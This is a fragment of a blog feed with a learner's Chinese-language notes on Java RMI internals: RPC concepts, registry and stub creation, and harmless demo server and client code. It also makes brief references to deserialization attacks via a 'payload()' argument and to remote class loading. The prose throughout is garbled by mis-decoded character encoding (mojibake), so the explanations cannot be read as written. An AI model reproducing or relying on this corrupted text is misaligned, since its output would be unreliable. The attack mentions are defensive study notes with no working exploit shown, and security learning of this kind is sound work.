LocateRegistry.createRegistry(1099);</code></p><p>2ã€ æ³¨å†Œä¸­å¿ƒç»‘å®š<br>        <code>registry.rebind(&quot;Hello&quot;, remoteObject);</code></p><p>3ã€æ³¨å†Œä¸­å¿ƒæ”¶åˆ°ç»‘å®šï¼Œå®¢æˆ·ç«¯è·å–æ³¨å†Œä¸­å¿ƒä¸å…¶é€šä¿¡</p><p>â€‹        <code>Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</code></p><p>4ã€æœåŠ¡æŸ¥æ‰¾</p><p>â€‹             <code>RemoteInterface stub = (RemoteInterface) registry.lookup(&quot;Hello&quot;);</code></p><p>5ã€æ³¨å†Œä¸­å¿ƒæ”¶åˆ°ç»“æœã€‚</p><p>6ã€è¿œç¨‹è°ƒç”¨æ–¹æ³•ï¼Œå¹¶ä¸”å°†è°ƒç”¨çš„å‚æ•°åºåˆ—åŒ–ã€‚</p><p>â€‹        <code>stub.sayGoodbye(payload())</code></p><p>7ã€æœåŠ¡ç«¯æ”¶åˆ°ä¿¡æ¯ï¼Œå°†å…¶ååºåˆ—åŒ–è¿›è¡Œã€‚</p><p>è™½ç„¶æ²¡æœ‰è·Ÿæ‡‚å†…éƒ¨æ·±å±‚ä»£ç ï¼Œä½†æ˜¯å¤§ä½“æµç¨‹å·²ç»æ¯”ä»¥å‰æ›´åŠ æ¸…æ¥šäº†ã€‚å˜¿å˜¿ã€‚</p><h1 id="RMIåŠ¨æ€ç±»åŠ è½½"><a href="#RMIåŠ¨æ€ç±»åŠ è½½" class="headerlink" title="RMIåŠ¨æ€ç±»åŠ è½½"></a>RMIåŠ¨æ€ç±»åŠ è½½</h1><p>ä»<code>JDK-6u45</code>å’Œ<code>JDK-7u21</code>å¼€å§‹<code>java.rmi.server.useCodebaseOnly</code>çš„å€¼å°±é»˜è®¤ä¸ºtrueï¼Œé˜²æ­¢JVMä»å…¶ä»–åœ°å€åŠ¨æ€åŠ è½½ç±»ï¼Œè€Œè¦å®ç°è¿œç¨‹åŠ è½½ç±»æ”»å‡»åˆ™éœ€è¦è¯¥å€¼ä¸º<code>false</code></p><p>è¿™é‡Œå°±ä¸å¤ç°äº†ã€‚</p><p>åˆ©ç”¨æ¡ä»¶å¤ªè¿‡è‹›åˆ»ï¼Œå®æˆ˜æ€§ä¸å¤§ï¼Œé…ç½®è¿‡ç¨‹ä¹Ÿå¾ˆéº»çƒ¦ï¼Œè¿™é‡Œå°±ä¸å¤ç°äº†</p><p>è¯¦è§ <a href="https://xz.aliyun.com/t/7900#toc-9">https://xz.aliyun.com/t/7900#toc-9</a></p>]]></content>
    
    
    <categories>
      
      <category>RMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMIï¼ˆ2ï¼‰</title>
    <link href="/2022/03/22/RMI%EF%BC%882%EF%BC%89/"/>
    <url>/2022/03/22/RMI%EF%BC%882%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMIï¼ˆ2ï¼‰"><a href="#RMIï¼ˆ2ï¼‰" class="headerlink" title="RMIï¼ˆ2ï¼‰"></a>RMIï¼ˆ2ï¼‰</h1><p>æ˜¨å¤©å¤ä¹ åˆ°äº†è¿œç¨‹å¯¹è±¡çš„åˆ›å»ºï¼Œä»Šå¤©ç»§ç»­å¼„ä¸€ä¸‹æ³¨å†Œä¸­å¿ƒçš„åˆ›å»ºã€‚<br>ï¼ˆå¼„ä¸€ä¼šå§ï¼Œå¾…ä¼šè¦çœ‹çœ‹çº¢è°·æ¯ã€‚ï¼‰</p><h3 id="è¿œç¨‹å¯¹è±¡çš„åˆ›å»º"><a href="#è¿œç¨‹å¯¹è±¡çš„åˆ›å»º" class="headerlink" title="è¿œç¨‹å¯¹è±¡çš„åˆ›å»º"></a>è¿œç¨‹å¯¹è±¡çš„åˆ›å»º</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754200.png" alt="QQæˆªå›¾20220322162245"></p><p>è·Ÿè¿›çœ‹çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754933.png" alt="QQæˆªå›¾20220322162323"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œnewäº†ä¸€ä¸ªRegistryImpl(),ç»§ç»­è·Ÿè¿›çœ‹çœ‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221631068.png" alt="QQæˆªå›¾20220322163112"></p><p>è¿™é‡Œå…ˆåˆ¤æ–­äº†æ˜¯ä¸æ˜¯1099ç«¯å£ï¼Œä»¥åŠSystem.getSecurityManagerä¸ºç©ºçš„åˆ¤æ–­ã€‚ç„¶åç»“æœä¸ºfalseï¼Œæ¥ç€newäº†ä¸€ä¸ªLiveRefï¼ˆï¼‰ç„¶ååˆnewäº†ä¸€ä¸ªUnicastServerRefï¼ˆï¼‰ã€‚æœ€åè°ƒç”¨setupè¿›è¡Œé…ç½®ã€‚è·Ÿè¿›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754393.png" alt="QQæˆªå›¾20220322163521"></p><p>è¿™é‡Œä¼šè¿›è¡Œåˆ›å»ºåŠ¨æ€ä»£ç†ï¼Œè·Ÿè¿›çœ‹çœ‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754975.png" alt="QQæˆªå›¾20220322163654"></p><p>è¿™é‡Œè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœéœ€è¦åˆ›å»ºä»£ç†çš„ç±»åœ¨æœ¬åœ°æœ‰ <code>_Stub</code> çš„ç±»ï¼Œåˆ™ç›´æ¥ä½¿ç”¨ createStub æ–¹æ³•åå°„è°ƒç”¨ stub ç±»çš„æ„é€ æ–¹æ³•åˆ›å»ºç±»å®ä¾‹ã€‚è¿›å…¥createStubï¼ˆï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754669.png" alt="QQæˆªå›¾20220322163801"></p><p>è¿™é‡Œç”±äºæ˜¯ RegistryImpl è¿™ä¸ªç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754042.png" alt="QQæˆªå›¾20220322163922"></p><p>ç³»ç»Ÿä¼šæ‰¾åˆ° RegistryImpl_Stub è¿™ä¸ªç±»å¹¶è¿›è¡Œå®ä¾‹åŒ–ï¼ŒRegistryImpl_Stub ç»§æ‰¿äº† RemoteStub ï¼Œå®ç°äº† Registryã€‚è¿™ä¸ªç±»å®ç°äº† bind&#x2F;list&#x2F;lookup&#x2F;rebind&#x2F;unbind ç­‰ Registry å®šä¹‰çš„æ–¹æ³•ï¼Œå…¨éƒ¨æ˜¯é€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å®ç°çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221740195.png" alt="QQæˆªå›¾20220322174028"></p><p>åˆ›å»ºå®Œä»£ç†ç±»ä¹‹åï¼Œä¼šè°ƒç”¨ setSkeleton æ–¹æ³•è°ƒç”¨ <code>Util.createSkeleton()</code> æ–¹æ³•åˆ›å»º skeletonã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754825.png" alt="QQæˆªå›¾20220322170011"></p><p>æ€»ç»“ï¼š</p><ul><li>è¿œç¨‹æœåŠ¡å¯¹è±¡ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œinvoke æ–¹æ³•æœ€ç»ˆè°ƒç”¨ UnicastRef çš„ invoke æ–¹æ³•ï¼Œæ³¨å†Œä¸­å¿ƒä½¿ç”¨ RegistryImpl_Stubï¼ŒåŒæ—¶è¿˜åˆ›å»ºäº† RegistryImpl_Skel</li><li>è¿œç¨‹å¯¹è±¡é»˜è®¤éšæœºç«¯å£ï¼Œæ³¨å†Œä¸­å¿ƒé»˜è®¤æ˜¯ 1099ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šï¼‰</li></ul><h3 id="æœåŠ¡æ³¨å†Œ"><a href="#æœåŠ¡æ³¨å†Œ" class="headerlink" title="æœåŠ¡æ³¨å†Œ"></a>æœåŠ¡æ³¨å†Œ</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754146.png" alt="QQæˆªå›¾20220322171112"></p><h2 id="æœåŠ¡å‘ç°"><a href="#æœåŠ¡å‘ç°" class="headerlink" title="æœåŠ¡å‘ç°"></a>æœåŠ¡å‘ç°</h2><ul><li>é¦–å…ˆåœ¨æœ¬åœ°åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«äº†å…·ä½“é€šä¿¡åœ°å€ã€ç«¯å£çš„ RegistryImpl_Stub å¯¹è±¡</li><li>é€šè¿‡è°ƒç”¨è¿™ä¸ªæœ¬åœ°çš„ RegistryImpl_Stub å¯¹è±¡çš„ bind&#x2F;listâ€¦ ç­‰æ–¹æ³•ï¼Œæ¥ä¸ Registry ç«¯è¿›è¡Œé€šä¿¡</li><li>è€Œ RegistryImpl_Stub çš„æ¯ä¸ªæ–¹æ³•ï¼Œéƒ½å®é™…ä¸Šè°ƒç”¨äº† RemoteRef çš„ invoke æ–¹æ³•ï¼Œè¿›è¡Œäº†ä¸€æ¬¡è¿œç¨‹è°ƒç”¨é“¾æ¥</li><li>è¿™ä¸ªè¿‡ç¨‹ä½¿ç”¨ java åŸç”Ÿåºåˆ—åŒ–åŠååºåˆ—åŒ–æ¥å®ç°</li></ul><h2 id="æœåŠ¡è°ƒç”¨"><a href="#æœåŠ¡è°ƒç”¨" class="headerlink" title="æœåŠ¡è°ƒç”¨"></a>æœåŠ¡è°ƒç”¨</h2><p>åœ¨è°ƒç”¨å…¶ lookup æ–¹æ³•æ—¶ï¼Œä¼šå‘ Registry ç«¯ä¼ é€’åºåˆ—åŒ–çš„ name ï¼Œç„¶åå°† Registry ç«¯å›ä¼ çš„ç»“æœååºåˆ—åŒ–ï¼Œå¾ˆå¥½ç†è§£ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä»¥åŠå¾ˆè¿·ç³Šäº†ã€‚æˆ‘ç»ˆç©¶è¿˜æ˜¯æ²¡æœ‰å¼„æ‡‚rmiçš„æµç¨‹ï¼ˆæ²¡æœ‰æ·±å…¥ä»£ç ï¼‰ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>RMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMIï¼ˆ1ï¼‰</title>
    <link href="/2022/03/21/RMI%EF%BC%881%EF%BC%89/"/>
    <url>/2022/03/21/RMI%EF%BC%881%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMIï¼ˆ1ï¼‰"><a href="#RMIï¼ˆ1ï¼‰" class="headerlink" title="RMIï¼ˆ1ï¼‰"></a>RMIï¼ˆ1ï¼‰</h1><p>è¿™ä¸€å‘¨æˆ‘éƒ½è¦å¥½å¥½æ€»ç»“ä¸€ä¸‹RMIï¼Œå®‰é™ä¸‹æ¥ï¼Œä¸è¦æµ®èºã€‚<br>å…ˆæ¥çœ‹çœ‹RPCã€‚</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>RPCï¼ˆRemote Procedure Call Protocolï¼‰è¿œç¨‹è¿‡ç¨‹è°ƒç”¨åè®®ï¼Œå®ƒæ˜¯ä¸€ç§é€šè¿‡ç½‘ç»œä»è¿œç¨‹è®¡ç®—æœºç¨‹åºä¸Šè¯·æ±‚æœåŠ¡ï¼Œè€Œä¸éœ€è¦äº†è§£åº•å±‚ç½‘ç»œæŠ€æœ¯çš„åè®®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203191716123.png" alt="QQæˆªå›¾20220319171603"></p><p>ç®€å•çš„è¯´ï¼ŒRPCå°±æ˜¯ä»ä¸€å°æœºå™¨(å®¢æˆ·ç«¯)ä¸Šé€šè¿‡å‚æ•°ä¼ é€’çš„æ–¹å¼è°ƒç”¨å¦ä¸€å°æœºå™¨(æœåŠ¡å™¨)ä¸Šçš„ä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•(å¯ä»¥ç»Ÿç§°ä¸ºæœåŠ¡)å¹¶å¾—åˆ°è¿”å›çš„ç»“æœã€‚</p><h3 id="RPCæ¡†æ¶"><a href="#RPCæ¡†æ¶" class="headerlink" title="RPCæ¡†æ¶"></a>RPCæ¡†æ¶</h3><ol><li>å®¢æˆ·ç«¯ï¼ˆClientï¼‰</li><li>å®¢æˆ·ç«¯å­˜æ ¹ï¼ˆClient Stubï¼‰ï¼š<strong>å­˜æ”¾æœåŠ¡ç«¯åœ°å€ä¿¡æ¯ï¼Œå°†å®¢æˆ·ç«¯çš„è¯·æ±‚å‚æ•°æ•°æ®ä¿¡æ¯æ‰“åŒ…æˆç½‘ç»œæ¶ˆæ¯ï¼Œå†é€šè¿‡ç½‘ç»œä¼ è¾“å‘é€ç»™æœåŠ¡ç«¯</strong></li><li>æœåŠ¡ç«¯å­˜æ ¹ï¼ˆServer Stubï¼‰ï¼š<strong>æ¥æ”¶å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚æ¶ˆæ¯å¹¶è¿›è¡Œè§£åŒ…ï¼Œç„¶åå†è°ƒç”¨æœ¬åœ°æœåŠ¡è¿›è¡Œå¤„ç†</strong></li><li>æœåŠ¡ç«¯ï¼ˆServerï¼‰</li></ol><h4 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203191729736.png" alt="QQæˆªå›¾20220319172927"></p><p>è¿™æ ·æˆ‘å°±ææ‡‚äº†RPCäº†ï¼Œå¾ˆå¤šæ–‡ç« è¯´rmiè·Ÿrpcç±»ä¼¼ã€‚<br>åœ¨å›è¿‡å¤´æ¥çœ‹rmiã€‚<br>è¿™é‡Œå°±è·Ÿç€su18çš„æ–‡ç« èµ°ä¸€ä¸‹ã€‚</p><h2 id="RMIæ•´ç†æµç¨‹å›¾"><a href="#RMIæ•´ç†æµç¨‹å›¾" class="headerlink" title="RMIæ•´ç†æµç¨‹å›¾"></a>RMIæ•´ç†æµç¨‹å›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251378.png" alt="QQæˆªå›¾20220319172357"></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="æ¥å£ï¼ˆè¿œç¨‹è°ƒç”¨ï¼‰"><a href="#æ¥å£ï¼ˆè¿œç¨‹è°ƒç”¨ï¼‰" class="headerlink" title="æ¥å£ï¼ˆè¿œç¨‹è°ƒç”¨ï¼‰"></a>æ¥å£ï¼ˆè¿œç¨‹è°ƒç”¨ï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-Remote"><a href="#java-rmi-Remote" class="headerlink" title="java.rmi.Remote"></a>java.rmi.Remote</h4><p>ç»§æ‰¿äº†Remoteçš„æ¥å£ä¸­çš„æ–¹æ³•ï¼Œæ‰å¯ä»¥è¢«<strong>è¿œç¨‹è°ƒç”¨</strong>ã€‚</p><h4 id="java-rmi-RemoteException"><a href="#java-rmi-RemoteException" class="headerlink" title="java.rmi.RemoteException;"></a>java.rmi.RemoteException;</h4><p>RemoteExceptionæ˜¯æ‰€æœ‰åœ¨è¿œç¨‹è°ƒç”¨ä¸­æ‰€æŠ›å‡ºå¼‚å¸¸çš„è¶…ç±»ï¼Œæ‰€æœ‰èƒ½å¤Ÿè¢«è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•å£°æ˜ï¼Œéƒ½éœ€è¦æŠ›å‡ºæ­¤å¼‚å¸¸ã€‚</p><h3 id="å®ç°æ¥å£"><a href="#å®ç°æ¥å£" class="headerlink" title="å®ç°æ¥å£"></a>å®ç°æ¥å£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend--Xsw6_a&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> name.getClass().getName();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-server-UnicastRemoteObject"><a href="#java-rmi-server-UnicastRemoteObject" class="headerlink" title="java.rmi.server.UnicastRemoteObject"></a>java.rmi.server.UnicastRemoteObject</h4><p>ç”¨äºè·å¾—ä¸€ä¸ªstubã€‚è¿™ä¸ªstubå°è£…äº†åº•å±‚ç»†èŠ‚ï¼Œç”¨äºå’Œè¿œç¨‹å¯¹è±¡è¿›è¡Œé€šä¿¡ã€‚æ‰©å±•æ­¤ç±»åï¼ŒRMI ä¼šè‡ªåŠ¨å°†è¿™ä¸ªç±» export ç»™è¿œç¨‹æƒ³è¦è°ƒç”¨å®ƒçš„ Client ç«¯ï¼ŒåŒæ—¶è¿˜æä¾›äº†ä¸€äº›åŸºç¡€çš„ <code>equals/hashcode/toString</code> æ–¹æ³•ã€‚</p><h3 id="RMIï¼ˆRegistryï¼‰"><a href="#RMIï¼ˆRegistryï¼‰" class="headerlink" title="RMIï¼ˆRegistryï¼‰"></a>RMIï¼ˆRegistryï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-registry-LocateRegistry"><a href="#java-rmi-registry-LocateRegistry" class="headerlink" title="java.rmi.registry.LocateRegistry"></a>java.rmi.registry.LocateRegistry</h4><p>ç”¨äºè·å–åˆ°<code>RMI Registry</code>çš„ä¸€ä¸ªè¿æ¥ï¼Œè¿™ä¸ªè¿æ¥å¯ä»¥ç”¨äºè·å–ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªæ³¨å†Œä¸­å¿ƒã€‚</p><h3 id="å°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®š"><a href="#å°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®š" class="headerlink" title="å°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®š"></a>å°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// ç»‘å®š</span><br>        registry.bind(<span class="hljs-string">&quot;Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-Naming"><a href="#java-rmi-Naming" class="headerlink" title="java.rmi.Naming"></a>java.rmi.Naming</h4><p>è¿™æ˜¯ä¸€ä¸ª final ç±»ï¼Œæä¾›å‘<code>RMI Registry</code>ä¿å­˜è¿œç¨‹å¯¹è±¡å¼•ç”¨æˆ–è€…ä»<code>RMI Registry</code>è·å–è¿œç¨‹å¯¹è±¡å¼•ç”¨çš„æ–¹æ³•ã€‚è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œæ¯ä¸€ä¸ªæ–¹æ³•éƒ½åŒ…å«äº†ä¸€ä¸ªç±»å‹ä¸ºStringçš„nameå‚æ•°, è¿™ä¸ªå‚æ•°æ˜¯URLæ ¼å¼ï¼Œå½¢å¦‚:&#x2F;&#x2F;host:port&#x2F;nameã€‚</p><ul><li>host è¡¨ç¤ºæ³¨å†Œè¡¨æ‰€åœ¨çš„ä¸»æœº</li><li>port è¡¨ç¤ºæ³¨å†Œè¡¨æ¥å—è°ƒç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º 1099</li><li>name è¡¨ç¤ºä¸€ä¸ªæ³¨å†Œ Remote Object çš„å¼•ç”¨çš„åç§°ï¼Œä¸èƒ½æ˜¯æ³¨å†Œè¡¨ä¸­çš„ä¸€äº›å…³é”®å­—</li></ul><h4 id="Namingçš„å‡½æ•°"><a href="#Namingçš„å‡½æ•°" class="headerlink" title="Namingçš„å‡½æ•°"></a>Namingçš„å‡½æ•°</h4><ul><li>bind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šï¼Œè¿™é‡Œçš„nameå…¶å®å°±æ˜¯URLæ ¼å¼ã€‚å¦‚æœè¯¥åå­—å·²ç»ä¸å…¶ä»–å¯¹è±¡ç»‘å®šï¼Œåˆ™æŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯ï¼›</li><li>rebind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šã€‚å¦‚æœæ”¹åå­—å·²ç»ä¸å…¶ä»–å¯¹è±¡ç»‘å®šï¼Œä¸ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯ï¼Œè€Œæ˜¯æŠŠå½“å‰å‚æ•°objæŒ‡å®šçš„å¯¹è±¡è¦†ç›–åŸå…ˆçš„å¯¹è±¡ï¼ˆæ›´æš´åŠ›ï¼‰ï¼›</li><li>lookup(String name)ï¼šæŸ¥æ‰¾å¯¹è±¡ï¼Œè¿”å›ä¸å‚æ•°nameæŒ‡å®šçš„åå­—æ‰€ç»‘å®šçš„å¯¹è±¡ï¼›</li><li>unbind(String name)ï¼šæ³¨é”€å¯¹è±¡ï¼Œå–æ¶ˆå¯¹è±¡ä¸åå­—çš„ç»‘å®šï¼›</li></ul><h3 id="å®¢æˆ·ç«¯è°ƒç”¨"><a href="#å®¢æˆ·ç«¯è°ƒç”¨" class="headerlink" title="å®¢æˆ·ç«¯è°ƒç”¨"></a>å®¢æˆ·ç«¯è°ƒç”¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><br>        <span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        System.out.println(Arrays.toString(registry.list()));<br><br>        <span class="hljs-comment">// lookup and call</span><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        System.out.println(stub.sayHello());<br>        System.out.println(stub.sayGoodbye());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å›æ˜¾"><a href="#å›æ˜¾" class="headerlink" title="å›æ˜¾"></a>å›æ˜¾</h3><p><img 